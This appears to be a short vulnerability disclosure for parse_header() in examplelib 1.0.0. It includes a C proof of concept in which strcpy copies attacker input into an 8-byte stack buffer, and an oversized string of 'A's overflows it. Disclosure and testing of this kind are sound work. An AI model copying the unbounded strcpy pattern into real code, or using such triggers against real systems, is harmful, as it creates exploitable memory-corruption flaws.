report.body:
parse_header() in examplelib 1.0.0 copies an attacker-supplied header into a fixed 8-byte stack buffer using strcpy() with no bounds check. A header longer than 8 bytes overflows the stack, enabling memory corruption / RCE.

Proof of concept:

```c
#include <string.h>
#include <stdio.h>
/* parse_header copies an attacker-supplied header into a fixed 8-byte buffer. */
void parse_header(const char *attacker_input){
    char buf[8];
    strcpy(buf, attacker_input);   /* no bounds check -> stack overflow */
    puts(buf);
}
int main(void){
    parse_header("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    return 0;
}
```
